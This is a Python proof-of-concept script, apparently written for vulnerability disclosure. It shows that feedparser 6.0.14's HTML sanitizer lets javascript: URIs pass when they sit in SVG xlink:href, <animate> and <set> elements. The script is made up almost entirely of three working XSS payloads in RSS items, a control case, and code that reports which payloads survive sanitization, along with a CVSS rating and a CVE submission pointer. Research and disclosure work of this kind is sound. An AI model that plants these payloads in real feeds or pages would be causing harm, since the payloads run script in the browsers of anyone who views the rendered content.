#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║          SECURITY RESEARCH — PROOF OF CONCEPT                          ║
║                                                                          ║
║  Researcher  : Noah Franklin                                             ║
║  Affiliation : Wolters Kluwer                                            ║
║  Date        : 2026-11-19                                                ║
║  Target      : feedparser 6.0.14 (PyPI)                                 ║
║  Vuln        : HTML Sanitizer Bypass → XSS via SVG (CWE-79/80/184)     ║
║  CVSS 3.1    : AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 Medium       ║
║                                                                          ║
║  Description : feedparser's _HTMLSanitizer only scheme-checks literal   ║
║  'href' attributes. Payloads using SVG xlink:href, <animate>, and       ║
║  <set> carry javascript: through the sanitizer intact. Any application  ║
║  that renders feedparser's "sanitized" output is exposed to XSS.        ║
║                                                                          ║
║  AUTHORIZED TESTING ONLY — isolated lab environment                     ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
import feedparser
import importlib.metadata as meta
from datetime import datetime, timezone

RESET = "\033[0m"; GREEN = "\033[0;32m"; RED = "\033[0;31m"
YELLOW = "\033[1;33m"; CYAN = "\033[0;36m"; BOLD = "\033[1m"; GRAY = "\033[0;90m"

def banner():
    print(f"\n{BOLD}{CYAN}  ╔══════════════════════════════════════════════════════╗")
    print(f"  ║  PoC: feedparser SVG Sanitizer Bypass → XSS          ║")
    print(f"  ║  Researcher : Noah Franklin  |  Wolters Kluwer       ║")
    print(f"  ╚══════════════════════════════════════════════════════╝{RESET}\n")

def make_feed(payload):
    return (f'<?xml version="1.0"?><rss version="2.0"><channel><title>t</title>'
            f'<item><title>i</title><description>{payload}</description></item>'
            f'</channel></rss>')

PAYLOADS = {
    "Vector A — SVG xlink:href":
        '<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(document.domain)"><text>CLICK</text></a></svg>',
    "Vector B — SVG <animate> (attributeName=xlink:href)":
        '<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="xlink:href" to="javascript:alert(document.domain)" begin="0s"/><text>CLICK</text></a></svg>',
    "Vector C — SVG <set> (attributeName=href)":
        '<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)"/><text>CLICK</text></a></svg>',
    "CONTROL — standard <a href=javascript:> (must be stripped)":
        '<a href="javascript:alert(1)">x</a>',
}

def main():
    version = meta.version("feedparser")
    banner()
    print(f"  {BOLD}Library   :{RESET} feedparser {version}")
    print(f"  {BOLD}Test date :{RESET} {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"  {BOLD}Purpose   :{RESET} Verify javascript: URI survives sanitization via SVG constructs\n")
    print(f"  {YELLOW}Running payloads against feedparser.parse() sanitizer...{RESET}\n")

    bypasses = 0
    for name, payload in PAYLOADS.items():
        feed = make_feed(payload)
        result = feedparser.parse(feed).entries[0].summary
        is_control = "CONTROL" in name
        survived = "javascript:" in result.lower()

        if is_control:
            status = f"{RED}✘ LEAK (control should be stripped){RESET}" if survived else f"{GREEN}✔ Correctly stripped{RESET}"
        else:
            status = f"{GREEN}✔ BYPASS — javascript: survived sanitization{RESET}" if survived else f"{GRAY}✗ Stripped{RESET}"
            if survived:
                bypasses += 1

        print(f"  {CYAN}[{'BYPASS' if survived and not is_control else 'OK' if not survived else 'LEAK'}]{RESET} {name}")
        print(f"    Status  : {status}")
        print(f"    Output  : {result[:120]}{'...' if len(result)>120 else ''}\n")

    print(f"{'─'*62}")
    if bypasses == 3:
        print(f"{GREEN}{BOLD}  [VULNERABLE] {bypasses}/3 SVG vectors bypass the sanitizer.{RESET}")
        print(f"{GREEN}  feedparser {version} returns javascript: in 'sanitized' output.{RESET}")
        print(f"{GREEN}  Applications rendering this output are exposed to XSS.{RESET}")
        print(f"{GREEN}  Submission: https://cveform.mitre.org/ — CWE-79{RESET}")
    else:
        print(f"{RED}{BOLD}  [NOT VULNERABLE] Sanitizer appears patched in {version}.{RESET}")
    print(f"{'─'*62}\n")
    print(f"  {GRAY}Researcher: Noah Franklin | {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}{RESET}\n")

if __name__ == "__main__":
    main()
